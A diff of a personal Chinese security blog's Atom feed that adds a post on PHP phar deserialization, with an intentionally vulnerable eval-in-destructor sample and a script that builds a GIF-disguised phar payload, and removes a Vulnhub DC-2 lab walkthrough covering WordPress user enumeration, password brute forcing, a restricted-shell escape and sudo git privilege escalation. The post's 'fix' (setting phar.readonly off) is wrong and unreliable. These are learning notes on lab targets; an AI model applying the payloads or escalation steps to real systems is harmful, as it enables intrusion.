@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://ckcah.github.io/"/>
-  <updated>2020-06-26T13:14:24.966Z</updated>
+  <updated>2020-08-01T00:19:18.196Z</updated>
   <id>https://ckcah.github.io/</id>
   
   <author>
@@ -17,11 +17,39 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>关于phar反序列化漏洞挖掘</title>
+    <link href="https://ckcah.github.io/2020/08/01/%E5%85%B3%E4%BA%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
+    <id>https://ckcah.github.io/2020/08/01/%E5%85%B3%E4%BA%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
+    <published>2020-08-01T01:17:05.000Z</published>
+    <updated>2020-08-01T00:19:18.196Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前提紧要"><a href="#前提紧要" class="headerlink" title="前提紧要"></a>前提紧要</h3><p>之前一直没太理解反序列化，只是有个模糊的概念。</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>说到PHP反序列化，大概就是围绕serialize()，unserialize()这两个函数</p><p>序列化说通俗点就是把一个对象变成可以传输的字符串</p><p>那反序列化不就是颠转过来吗</p><h4 id="反序列化漏洞造成原因"><a href="#反序列化漏洞造成原因" class="headerlink" title="反序列化漏洞造成原因"></a>反序列化漏洞造成原因</h4><p>服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了</p><h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><p>关于php官网中phar的介绍是这样的</p><img src="https://ckcah.github.io/images/关于phar反序列化漏洞挖掘/1.jpg"><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p>简单来说<code>phar</code>就是<code>php</code>压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file://</code> <code>php://</code>等类似，也是一种流包装器。</p><p><code>phar</code>结构由 4 部分组成</p><ul><li><code>stub</code> phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li><li><code>manifest</code> 压缩文件的属性等信息，以<strong>序列化</strong>存储，是主要的攻击点。</li><li><code>contents</code> 压缩文件的内容；</li><li><code>signature</code> 签名，放在文件末尾；</li></ul><p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者<code>pdf</code>文件来绕过一些上传限制；二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多。</p><table><thead><tr><th>受影响函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h4><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，就可以造成反序列化的攻击，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class A&#123;</span><br><span class="line">   public $name;</span><br><span class="line">   public function __construct()&#123;</span><br><span class="line">     echo &quot;对象创建调用&lt;br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   public function __destruct()&#123;</span><br><span class="line">     eval($this-&gt;name);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($_GET[&#39;file&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现函数file_exists,存在危险函数可控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class A &#123;</span><br><span class="line">         public function __construct()&#123;</span><br><span class="line">            $this-&gt;name &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     @unlink(&quot;phar.phar&quot;);</span><br><span class="line">     $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $o &#x3D; new A();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>phar文件是通过stub来标识的，是通过xxx<?php xxx.__HALT_COMPILER(); ?>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p><p><code>phar.readonly = off</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
+      
+    
+    </summary>
+    
+    
+      <category term="反序列化漏洞" scheme="https://ckcah.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="文件漏洞" scheme="https://ckcah.github.io/categories/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="phar" scheme="https://ckcah.github.io/tags/phar/"/>
+    
+  </entry>
+  
+  <entry>
     <title>回归</title>
     <link href="https://ckcah.github.io/2020/06/26/%E5%9B%9E%E5%BD%92/"/>
     <id>https://ckcah.github.io/2020/06/26/%E5%9B%9E%E5%BD%92/</id>
     <published>2020-06-26T13:09:50.000Z</published>
-    <updated>2020-06-26T13:14:24.966Z</updated>
+    <updated>2020-06-26T13:14:50.002Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>考完试了，正式回归！！！！！！！！！</p>]]></content>
     
@@ -42,8 +70,8 @@
   
   <entry>
     <title>倒计时</title>
-    <link href="https://ckcah.github.io/2020/06/07/%E5%80%92%E8%AE%A1%E6%97%B6/"/>
-    <id>https://ckcah.github.io/2020/06/07/%E5%80%92%E8%AE%A1%E6%97%B6/</id>
+    <link href="https://ckcah.github.io/2020/06/08/%E5%80%92%E8%AE%A1%E6%97%B6/"/>
+    <id>https://ckcah.github.io/2020/06/08/%E5%80%92%E8%AE%A1%E6%97%B6/</id>
     <published>2020-06-07T18:13:21.000Z</published>
     <updated>2020-06-07T06:16:08.000Z</updated>
     
@@ -66,8 +94,8 @@
   
   <entry>
     <title>绕过CDN寻找真实IP的8种方法</title>
-    <link href="https://ckcah.github.io/2020/05/26/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
-    <id>https://ckcah.github.io/2020/05/26/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
+    <link href="https://ckcah.github.io/2020/05/27/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
+    <id>https://ckcah.github.io/2020/05/27/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
     <published>2020-05-26T22:19:45.000Z</published>
     <updated>2020-05-26T10:57:12.000Z</updated>
     
@@ -92,8 +120,8 @@
   
   <entry>
     <title>黑客入侵该如何应急排查(2)</title>
-    <link href="https://ckcah.github.io/2020/05/26/%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-2/"/>
-    <id>https://ckcah.github.io/2020/05/26/%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-2/</id>
+    <link href="https://ckcah.github.io/2020/05/27/%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-2/"/>
+    <id>https://ckcah.github.io/2020/05/27/%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-2/</id>
     <published>2020-05-26T21:52:33.000Z</published>
     <updated>2020-05-26T10:22:16.000Z</updated>
     
@@ -174,8 +202,8 @@
   
   <entry>
     <title>SSI注入</title>
-    <link href="https://ckcah.github.io/2020/05/23/SSI%E6%B3%A8%E5%85%A5/"/>
-    <id>https://ckcah.github.io/2020/05/23/SSI%E6%B3%A8%E5%85%A5/</id>
+    <link href="https://ckcah.github.io/2020/05/24/SSI%E6%B3%A8%E5%85%A5/"/>
+    <id>https://ckcah.github.io/2020/05/24/SSI%E6%B3%A8%E5%85%A5/</id>
     <published>2020-05-24T00:58:15.000Z</published>
     <updated>2020-05-23T13:25:26.000Z</updated>
     
@@ -200,8 +228,8 @@
   
   <entry>
     <title>新蓝牙漏洞</title>
-    <link href="https://ckcah.github.io/2020/05/22/%E6%96%B0%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://ckcah.github.io/2020/05/22/%E6%96%B0%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E/</id>
+    <link href="https://ckcah.github.io/2020/05/23/%E6%96%B0%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://ckcah.github.io/2020/05/23/%E6%96%B0%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E/</id>
     <published>2020-05-22T20:54:50.000Z</published>
     <updated>2020-05-22T10:10:56.000Z</updated>
     
@@ -226,8 +254,8 @@
   
   <entry>
     <title>文件上传绕过总结</title>
-    <link href="https://ckcah.github.io/2020/05/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
-    <id>https://ckcah.github.io/2020/05/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
+    <link href="https://ckcah.github.io/2020/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
+    <id>https://ckcah.github.io/2020/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
     <published>2020-05-22T20:31:46.000Z</published>
     <updated>2020-05-22T08:53:22.000Z</updated>
     
@@ -356,8 +384,8 @@
   
   <entry>
     <title>web漏洞利用之弱口令</title>
-    <link href="https://ckcah.github.io/2020/05/14/web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
-    <id>https://ckcah.github.io/2020/05/14/web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4/</id>
+    <link href="https://ckcah.github.io/2020/05/15/web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    <id>https://ckcah.github.io/2020/05/15/web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4/</id>
     <published>2020-05-15T00:04:53.000Z</published>
     <updated>2020-05-14T21:28:32.000Z</updated>
     
@@ -446,8 +474,8 @@
   
   <entry>
     <title>DC-4</title>
-    <link href="https://ckcah.github.io/2020/05/13/DC-4/"/>
-    <id>https://ckcah.github.io/2020/05/13/DC-4/</id>
+    <link href="https://ckcah.github.io/2020/05/14/DC-4/"/>
+    <id>https://ckcah.github.io/2020/05/14/DC-4/</id>
     <published>2020-05-13T23:17:47.000Z</published>
     <updated>2020-05-13T21:34:08.000Z</updated>
     
@@ -474,8 +502,8 @@
   
   <entry>
     <title>常见WAF绕过</title>
-    <link href="https://ckcah.github.io/2020/05/13/%E5%B8%B8%E8%A7%81WAF%E7%BB%95%E8%BF%87/"/>
-    <id>https://ckcah.github.io/2020/05/13/%E5%B8%B8%E8%A7%81WAF%E7%BB%95%E8%BF%87/</id>
+    <link href="https://ckcah.github.io/2020/05/14/%E5%B8%B8%E8%A7%81WAF%E7%BB%95%E8%BF%87/"/>
+    <id>https://ckcah.github.io/2020/05/14/%E5%B8%B8%E8%A7%81WAF%E7%BB%95%E8%BF%87/</id>
     <published>2020-05-13T23:13:23.000Z</published>
     <updated>2020-05-13T12:26:16.000Z</updated>
     
@@ -500,8 +528,8 @@
   
   <entry>
     <title>DC_3</title>
-    <link href="https://ckcah.github.io/2020/05/13/DC-3/"/>
-    <id>https://ckcah.github.io/2020/05/13/DC-3/</id>
+    <link href="https://ckcah.github.io/2020/05/14/DC-3/"/>
+    <id>https://ckcah.github.io/2020/05/14/DC-3/</id>
     <published>2020-05-13T22:54:58.000Z</published>
     <updated>2020-05-13T13:00:56.000Z</updated>
     
@@ -525,34 +553,6 @@
       <category term="vulnhub" scheme="https://ckcah.github.io/tags/vulnhub/"/>
     
       <category term="Joomla" scheme="https://ckcah.github.io/tags/Joomla/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DC_2</title>
-    <link href="https://ckcah.github.io/2020/05/13/DC-2/"/>
-    <id>https://ckcah.github.io/2020/05/13/DC-2/</id>
-    <published>2020-05-13T22:54:53.000Z</published>
-    <updated>2020-05-13T13:01:22.000Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>信息安全初学者一枚，正在努力提升中。。。。</p><p>今天渗透的实验靶场，是Vulnhub的DC-2，和之前的DC-1是同系列的。</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>成功安装virtual Box，只需要下载vlunhub的DC-2项目，导入virtual中即可使用，不需要登录什么的。</p><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>老样子，打开你的kali，直接nmap，使用参数-Pn扫描网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/1.png"><p>继续扫描主机的详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.3.13</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/2.png"><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>既然开启了80端口，那就直接浏览器访问吧</p><img src="https://ckcah.github.io/images/DC_2/3.png"><p>然后发现，这是将IP地址重定向了，那就，直接在/etc/hosts里进行设置吧（请注意，在windows下边，hosts文件在C:\Windows\System32\drivers\etc中）</p><img src="https://ckcah.github.io/images/DC_2/4.png"><p>修改完成后，再一次在浏览器中进行浏览，成功打开界面</p><img src="https://ckcah.github.io/images/DC_2/5.png"><h2 id="0x03-flag1"><a href="#0x03-flag1" class="headerlink" title="0x03 flag1"></a>0x03 flag1</h2><p>可以看到flag就在眼前</p><img src="https://ckcah.github.io/images/DC_2/6.png"><p>用dirb扫描一下目录吧，看看有没有有用的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;dc-2&#x2F;</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/7.png"><p>这个好像是他的后台，先不管。</p><h2 id="0x04-flag2"><a href="#0x04-flag2" class="headerlink" title="0x04 flag2"></a>0x04 flag2</h2><p>之前找到的flag1的提示大概是：常用的密码可能无法使用，所以需要用到<strong><em>cewl</em></strong>这个工具。</p><p>好的，了解了。</p><p>kali中有一款专门针对wordpress的渗透工具，叫做wpscan，现在请出这个神器，对网站进行用户探测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u</span><br><span class="line">-e:枚举幸喜</span><br><span class="line">u： 枚举用户名，默认从1-10</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/8.png"><p>成功枚举出用户admin、jerry、tom。</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>wpscan这个工具，怎么说，好用是好用，就是kali里，它好像，无法更新数据库？当时遇到这个问题的时候，在经过半个小时的查询后，我终于找到了办法。请参考<a href="https://blog.csdn.net/zhang644720213/article/details/92849717" target="_blank" rel="noopener">wpscan数据库无法更新</a></p><p>ok，既然知道了用户有哪些，就直接用cewl根据这个网站，生成一个密码字典吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2&#x2F; -w 1</span><br><span class="line">-w 后边接文件名：表示将结果写入文件中</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/9.png"><p>然后我们将上边枚举出的3个用户写入另一个空白文件中</p><img src="https://ckcah.github.io/images/DC_2/10.png"><p>接下来，直接用wpscan，去匹配文件密码就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -U 2 -P 1</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/11.png"><p>成功爆破出jerry和tom的用户密码：adipiscing和parturient</p><p>之前dirb扫描出的后台目录派上了用场，直接用账号密码登录，成功找到flag2</p><img src="https://ckcah.github.io/images/DC_2/12.png"><h2 id="0x05-flag3"><a href="#0x05-flag3" class="headerlink" title="0x05 flag3"></a>0x05 flag3</h2><p>最开始nmap扫描的时候，就已经看到了，存在ssh端口7744，然后尝试用得到的账号密码登录。发现jerry不可登录，但是tom可以</p><img src="https://ckcah.github.io/images/DC_2/13.png"><p>成功进入</p><p>尝试执行一些命令，发现，它对用户做了限制</p><img src="https://ckcah.github.io/images/DC_2/14.png"><p>尝试了一下用vi打开，生效了？但是，网上有些文章说的是，需要进行一些操作才能看到，emm，不知道为什么可以看，所以不能演示绕过操作。</p><img src="https://ckcah.github.io/images/DC_2/15.png"><h2 id="0x06-flag4"><a href="#0x06-flag4" class="headerlink" title="0x06 flag4"></a>0x06 flag4</h2><p>flag3的提示大概是说，emmm，反正就是和jerry有关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/16.png"><p>出错了，没权限。那，应该是和上边那个权限转化有关了</p><p>所以，就 直接vi 来转义一下受限制的 shell吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br><span class="line">export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATH</span><br><span class="line">export SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/17.png"><p>成功转化</p><img src="https://ckcah.github.io/images/DC_2/18.png"><p>找找flag4在哪</p><img src="https://ckcah.github.io/images/DC_2/19.png"><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>提示说：现在我是独自战斗了，不是很开心。。。</p><p>按照dc-1的套路，尝试查看可以sudo的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><img src="https://ckcah.github.io/images/DC_2/20.png"><p>它在说什么？？？注意到，最后那句话， 唯一条件，jerry 可以用 root 权限执行 git </p><p>好吧，技术有限，不知道怎么办了，于是找了一篇管理最后提权的<a href="https://pentesterjourney.com/2019/05/17/vulnhub-dc-2-walkthrough/" target="_blank" rel="noopener">博客</a>,其中介绍到<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>是一个精选的Unix二进制列表，攻击者可以利用它来绕过本地安全限制</p><p>找到关于git的相关利用方法</p><img src="https://ckcah.github.io/images/DC_2/21.png"><img src="https://ckcah.github.io/images/DC_2/22.png"><p>使用上边的方法，可以直接提权，原理大概就是通过交互模式来绕过受限环境，已达到提权的效果</p><img src="https://ckcah.github.io/images/DC_2/23.png"><p>成功提权</p><img src="https://ckcah.github.io/images/DC_2/24.png"><p>查看最后一个flag！！！</p><img src="https://ckcah.github.io/images/DC_2/25.png">]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="https://ckcah.github.io/categories/kali/"/>
-    
-      <category term="内网渗透" scheme="https://ckcah.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="vulnhub" scheme="https://ckcah.github.io/tags/vulnhub/"/>
     
   </entry>
   
